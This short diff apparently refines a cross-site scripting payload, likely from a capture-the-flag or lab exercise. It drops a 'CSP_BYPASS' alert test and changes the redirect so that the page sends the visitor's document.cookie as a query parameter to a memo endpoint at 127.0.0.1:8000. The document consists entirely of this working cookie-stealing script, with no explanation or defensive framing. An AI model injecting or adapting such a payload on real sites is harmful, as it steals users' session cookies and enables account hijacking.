@@ -1,4 +1,3 @@
 <script>
-alert('CSP_BYPASS');
-location='http://localhost:8000/memo?memo='+document.cookie;
+location='http://127.0.0.1:8000/memo?memo='+document.cookie;
 </script>
